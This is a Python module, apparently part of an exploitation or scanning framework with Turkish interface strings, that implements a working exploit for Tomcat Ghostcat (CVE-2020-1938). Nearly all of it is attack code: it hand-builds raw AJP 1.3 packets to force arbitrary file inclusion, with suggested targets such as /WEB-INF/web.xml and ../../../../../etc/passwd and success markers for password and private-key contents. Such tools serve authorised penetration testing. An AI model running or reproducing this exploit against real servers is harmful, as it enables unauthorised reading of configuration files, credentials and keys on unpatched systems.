"""poc/java_web.py — native Java / Tomcat PoCs.

Implements Tomcat **Ghostcat (CVE-2020-1938)** over a raw TCP socket: the scanner
speaks the AJP 1.3 protocol itself (no curl / external tool) and forces Tomcat to
include an arbitrary file, returning its real bytes.

AJP 1.3 GET_MESSAGE_BODY request layout (verified byte-for-byte):
    12 34              data format prefix
    04                 AJP_GET_MESSAGE_BODY
    [len:2]            message length (bytes that follow)
      [2]len "HTTP/1.1"          request protocol
      [2]len "GET"               method
      [2]len "/index.jsp"       request URI
      FF FF                      no query string
      [attrs] javax.servlet.include.{request_uri,path_info,servlet_path,context_path}
      00 FF                      end of attributes
      FF FF                      no request body
Response:
    12 34 02 [len:2] [status:2] [reason] [attrs] 00 FF [body...]   <- body = file bytes
"""
from __future__ import annotations

import socket

_RCE_MARKERS = ["web-app", "Manifest-Version", "root:x:0:0", "uid=", "password", "private-key"]


def _s(b) -> bytes:
    if isinstance(b, str):
        b = b.encode("latin1")
    return bytes([len(b) >> 8, len(b) & 0xff]) + b


def _attr(name: str, value: str) -> bytes:
    return _s(name) + _s(value)


def _build_ajp(include: str, servlet_path: str = "/index.jsp",
               context_path: str = "/", uri: str = "/index.jsp") -> bytes:
    reqline = _s("HTTP/1.1") + _s("GET") + _s(uri) + b"\xff\xff"          # no query string
    attrs = (_attr("javax.servlet.include.request_uri", include)
             + _attr("javax.servlet.include.path_info", include)
             + _attr("javax.servlet.include.servlet_path", servlet_path)
             + _attr("javax.servlet.include.context_path", context_path)
             + b"\x00\xff")
    payload = reqline + attrs + b"\xff\xff"                                # no request body
    return b"\x12\x34\x04" + bytes([len(payload) >> 8, len(payload) & 0xff]) + payload


def _recv(sk: socket.socket, timeout: float) -> bytes:
    data = bytearray()
    sk.settimeout(timeout)
    try:
        while True:
            c = sk.recv(65536)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    return bytes(data)


def _parse_response(data: bytes):
    if len(data) < 9 or data[:2] != b"\x12\x34":
        return {"status": 0, "body": data}
    status = int.from_bytes(data[5:7], "big")
    i = 7
    rlen = int.from_bytes(data[i:i + 2], "big")
    i += 2 + rlen
    # skip attribute headers until end-of-attributes marker
    while i + 2 <= len(data):
        nlen = int.from_bytes(data[i:i + 2], "big")
        i += 2
        if data[i] == 0x00 and data[i + 1] == 0xFF:
            i += 2
            break
        i += nlen                                   # name
        vlen = int.from_bytes(data[i:i + 2], "big")
        i += 2 + vlen                               # value
    return {"status": status, "body": data[i:]}


def ghostcat(params) -> dict:
    host = (params.get("host") or "").strip()
    if not host:
        return {"ok": False, "success": False, "error": "host gerekli (AJP host)"}
    if ":" in host:
        host, _, port = host.partition(":")
    else:
        port = str(params.get("port") or 8009)
    include = (params.get("file") or params.get("path") or "/WEB-INF/web.xml").strip()
    servlet_path = (params.get("servlet_path") or "/index.jsp").strip()
    context_path = (params.get("context_path") or "/").strip()
    marker = (params.get("marker") or "").strip()
    log = [f"AJP {host}:{port} include={include} servlet_path={servlet_path} ctx={context_path!r}"]

    try:
        sk = socket.create_connection((host, int(port)), timeout=12)
    except Exception as e:
        return {"ok": False, "success": False, "error": f"AJP baglanti hatasi: {e}", "log": log}
    try:
        sk.sendall(_build_ajp(include, servlet_path, context_path))
        data = _recv(sk, timeout=12)
    finally:
        sk.close()

    res = _parse_response(data)
    body = res["body"]
    txt = body.decode("utf-8", "replace")
    markers = [marker] if marker else _RCE_MARKERS
    success = bool(marker and marker in txt) or any(m in txt for m in _RCE_MARKERS)
    if len(data) == 0:
        log.append("empty AJP response — is AJP off, is secretRequired set, or is the version patched (>=9.0.31/8.5.51/7.0.100)?")
        success = False
    log.append(f"resp_bytes={len(data)} status={res['status']} success={success}")
    return {
        "ok": True,
        "success": bool(success),
        "status": res["status"],
        "evidence": (txt[:4000] if txt else f"<binary {len(body)} bytes: {body[:64].hex()}>"),
        "detail": {
            "host": f"{host}:{port}", "include": include,
            "protocol": "AJP/1.3", "resp_bytes": len(data),
            "note": "Ghostcat/CVE-2020-1938: AJP include -> arbitrary file read",
        },
        "log": log,
    }


def _in(label, key, req, default="", ph=""):
    return {"key": key, "label": label, "req": req, "default": default, "placeholder": ph}


_INPUTS = [
    _in("AJP host:port", "host", True, "", "127.0.0.1:8009"),
    _in("Okunacak dosya", "file", False, "/WEB-INF/web.xml", "/WEB-INF/web.xml | ../../../../../etc/passwd"),
    _in("servlet_path", "servlet_path", False, "/index.jsp", "/index.jsp"),
    _in("context_path", "context_path", False, "/", "/"),
    _in("Kanit (ops.)", "marker", False, "", "web-app | root:x:0:0"),
]


EXPLOITS = {
    "CVE-2020-1938": {
        "name": "Tomcat Ghostcat — AJP arbitrary file read",
        "type": "FileRead", "preauth": True,
        "affected": ["7.0.x<7.0.100", "8.5.x<8.5.51", "9.0.x<9.0.31"],
        "note": ("Native AJP/1.3 (raw socket): javax.servlet.include.* attribute'lari ile Tomcat'i "
                 "keyfi dosyayi include etmeye zorlar. Kanit = dosyanin gercek byte'lari "
                 "(WEB-INF/web.xml, MANIFEST, /etc/passwd). AJP 8009 open + secretRequired=false "
                 "(pre-9.0.31/8.5.51/7.0.100) hedefte calisir."),
        "inputs": list(_INPUTS),
        "run": ghostcat,
    },
}
